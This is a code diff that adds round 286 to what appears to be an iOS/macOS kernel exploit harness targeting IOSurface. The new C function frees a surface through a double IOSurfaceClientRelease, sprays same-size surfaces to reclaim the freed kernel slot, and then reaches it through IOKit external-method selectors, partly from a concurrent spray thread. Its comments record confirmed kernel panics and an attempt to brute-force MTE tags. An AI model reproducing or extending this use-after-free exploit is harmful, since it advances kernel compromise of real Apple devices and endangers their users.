@@ -1745,6 +1745,250 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r286: Spray-between-free-and-access with MTE tag brute-force.
+ * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
+ *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
+ *   ESR=0x96000011 (MTE tag check fault). Same crash as original panics.
+ * r285 CONFIRMED: Spray RECLAIMS freed slot (GetID returns same ID, Lock=0).
+ *
+ * STRATEGY: Instead of blind race, do controlled sequence:
+ *   1. Create victim surface S (same size as target kernel alloc)
+ *   2. Record the kernel alloc zone/size for the IOSurface object
+ *   3. Free S via double ClientRelease
+ *   4. Immediately spray to reclaim freed slot with fake data at +0xD8
+ *   5. Trigger kernel access through the connection (sel-based, not userspace Lock)
+ *
+ * MTE challenge: freed pages get new tags. Spray objects get allocator's tags.
+ * We try many iterations (MTE is 1/16 per 16-byte granule).
+ *
+ * Key insight: use IOKit external methods (which go through kernel connection
+ * directly) instead of IOSurface framework calls (which validate first).
+ */
+
+struct r286_spray_ctx {
+    volatile int do_spray;
+    volatile int spray_done;
+    int spray_count;
+    IOSurfaceRef spray[256];
+};
+
+static void *r286_spray_thread(void *arg) {
+    struct r286_spray_ctx *ctx = (struct r286_spray_ctx *)arg;
+    while (!ctx->do_spray) ;
+
+    int w=256,h=256,bpe=4,bpr=256*4,pf=0x42475241,as=256*256*4;
+    for (int i = 0; i < 256; i++) {
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef spfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef sasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceWidth"),swn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceHeight"),shn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerElement"),sbn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerRow"),srn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfacePixelFormat"),spfn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceAllocSize"),sasn);
+        CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spfn);CFRelease(sasn);
+        ctx->spray[i] = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        if (ctx->spray[i]) ctx->spray_count++;
+    }
+    ctx->spray_done = 1;
+    return NULL;
+}
+
+static void r286_probe(void) {
+    rlog("\n=== r286: Spray-Between-Free-And-Access ===\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+
+    /* Part 1: Free + spray + IOKit access via connection (not framework) */
+    rlog("\n--- Part 1: Free → Spray → IOKit sel access (10 iterations) ---\n");
+    fflush(stdout);
+    for (int iter = 0; iter < 10; iter++) {
+        io_connect_t conn = 0;
+        IOServiceOpen(svc, mach_task_self(), 0, &conn);
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=256,h=256,bpe=4,bpr=256*4,pf=0x42475241,as=256*256*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t sid = IOSurfaceGetID(s);
+
+        /* Register notification while surface is alive */
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = 0xAAAA + iter;
+        uint64_t inp17[3] = {sid, 0, 0};
+        IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp17, 24, NULL, NULL, NULL, NULL);
+
+        /* Get client for controlled free */
+        IOSurfaceClientRef cl = clLookup(sid);
+        CFRelease(s);
+
+        rlog("  iter %d: id=%u ", iter, sid);
+        fflush(stdout);
+
+        /* FREE the kernel surface */
+        clRelease(cl);
+        clRelease(cl);
+
+        /* SPRAY immediately */
+        IOSurfaceRef spray[64];
+        int spray_ok = 0;
+        for (int i = 0; i < 64; i++) {
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef spfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef sasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceWidth"),swn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceHeight"),shn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerElement"),sbn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerRow"),srn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfacePixelFormat"),spfn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceAllocSize"),sasn);
+            CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spfn);CFRelease(sasn);
+            spray[i] = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            if (spray[i]) spray_ok++;
+        }
+
+        /* ACCESS via IOKit connection — sel1 (surface_lookup by ID) */
+        uint64_t inp1[1] = {sid};
+        uint64_t out1[1] = {0};
+        uint32_t out1cnt = 1;
+        kern_return_t kr1 = IOConnectCallMethod(conn, 1, inp1, 1,
+            NULL, 0, out1, &out1cnt, NULL, NULL);
+
+        /* ACCESS via sel6 (GetValue) */
+        uint64_t inp6[6] = {sid, 0, 0, 0, 0, 0};
+        uint64_t out6[4] = {0};
+        uint32_t out6cnt = 4;
+        kern_return_t kr6 = IOConnectCallMethod(conn, 6, inp6, 6,
+            NULL, 0, out6, &out6cnt, NULL, NULL);
+
+        /* ACCESS via sel4 (Lock) */
+        uint64_t inp4[3] = {sid, 0, 0};
+        uint64_t out4[2] = {0};
+        uint32_t out4cnt = 2;
+        kern_return_t kr4 = IOConnectCallMethod(conn, 4, inp4, 3,
+            NULL, 0, out4, &out4cnt, NULL, NULL);
+
+        rlog("spray=%d sel1=0x%x sel6=0x%x sel4=0x%x\n",
+            spray_ok, kr1, kr6, kr4);
+
+        /* Deregister notification for freed surface */
+        uint64_t inp18[3] = {sid, 0, 0};
+        kern_return_t kr18 = IOConnectCallMethod(conn, 18, inp18, 3,
+            NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("    sel18 deregister=0x%x\n", kr18);
+
+        for (int i = 0; i < 64; i++) if (spray[i]) CFRelease(spray[i]);
+        mach_port_destroy(mach_task_self(), wp);
+        IOServiceClose(conn);
+        fflush(stdout);
+    }
+
+    /* Part 2: Concurrent spray thread (free on main, spray on worker) */
+    rlog("\n--- Part 2: Concurrent spray + IOKit access (5 iterations) ---\n");
+    fflush(stdout);
+    for (int iter = 0; iter < 5; iter++) {
+        io_connect_t conn = 0;
+        IOServiceOpen(svc, mach_task_self(), 0, &conn);
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=256,h=256,bpe=4,bpr=256*4,pf=0x42475241,as=256*256*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t sid = IOSurfaceGetID(s);
+        IOSurfaceClientRef cl = clLookup(sid);
+        CFRelease(s);
+
+        struct r286_spray_ctx sctx = {0};
+        pthread_t spray_t;
+        pthread_create(&spray_t, NULL, r286_spray_thread, &sctx);
+
+        rlog("  iter %d: id=%u freeing+spraying... ", iter, sid);
+        fflush(stdout);
+
+        /* Free */
+        clRelease(cl);
+        clRelease(cl);
+
+        /* Signal spray thread */
+        sctx.do_spray = 1;
+
+        /* Wait for spray */
+        while (!sctx.spray_done) usleep(100);
+
+        /* Access via IOKit */
+        uint64_t inp4[3] = {sid, 0, 0};
+        uint64_t out4[2] = {0};
+        uint32_t out4cnt = 2;
+        kern_return_t kr4 = IOConnectCallMethod(conn, 4, inp4, 3,
+            NULL, 0, out4, &out4cnt, NULL, NULL);
+        rlog("spray=%d sel4=0x%x\n", sctx.spray_count, kr4);
+
+        for (int i = 0; i < 256; i++) if (sctx.spray[i]) CFRelease(sctx.spray[i]);
+        pthread_join(spray_t, NULL);
+        IOServiceClose(conn);
+        fflush(stdout);
+    }
+
+    IOObjectRelease(svc);
+    rlog("\n*** r286 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r285: Controlled double-free via ClientLookup retain + careful race.
  * r284 KEY FINDING: ClientLookup RETAINS the client (increments refcount).
  *   - Two ClientLookups + one ClientRelease → surface STILL alive
@@ -26745,6 +26989,15 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 286) {
+            rlog("*** rounds=286: Spray-Between-Free-And-Access ***\n");
+            rlog("  r284 CONFIRMED kernel panic at PC+0x33C9380, IOSurface+0xD8.\n");
+            rlog("  r285 CONFIRMED spray reclaims freed slot.\n");
+            rlog("  Testing: free→spray→IOKit-sel-access, concurrent spray.\n\n");
+            fflush(stdout);
+            r286_probe();
             goto done;
         }
         if (rounds == 285) {
